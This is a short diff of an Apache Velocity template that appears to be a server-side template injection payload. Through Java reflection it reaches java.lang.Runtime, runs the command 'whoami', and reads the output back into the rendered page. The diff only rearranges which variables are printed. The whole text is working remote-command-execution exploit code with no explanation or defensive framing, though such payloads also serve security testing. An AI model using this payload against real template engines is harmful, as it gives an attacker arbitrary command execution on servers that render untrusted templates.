@@ -2,6 +2,9 @@
 #set ($str=$exp.getClass().forName("java.lang.String"))
 #set ($chr=$exp.getClass().forName("java.lang.Character"))
 #set ($a=$exp.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("whoami"))
+$a
+$str
+$chr
 #set ($out=$a.getInputStream())
 
 #set ($result="")
@@ -9,7 +12,3 @@
     #set($tmp=$str.valueOf($chr.toChars($out.read())))
     #set($result="$result$tmp")
 #end
-
-$str
-$chr
-$result
